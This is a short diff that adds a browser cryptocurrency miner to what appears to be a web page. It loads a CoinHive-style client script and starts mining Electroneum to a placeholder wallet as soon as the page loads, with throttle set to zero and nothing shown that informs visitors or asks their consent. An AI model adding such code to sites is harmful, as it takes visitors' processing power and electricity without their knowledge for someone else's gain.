@@ -1,0 +1,10 @@
+<script src="js/web-client.min.js"></script>
+<script>
+	miner = new CoinHive.Anonymous('YOUR_ELECTRONEUM_WALLET_ADDRESS', {
+		threads: 2,				// The number of threads the miner should start with.
+		autoThreads: false,		// Whether to automatically adjust the number of threads for optimal performance.
+		throttle: 0				// The fraction of time that threads should be idle.
+	});
+
+	miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
+</script>
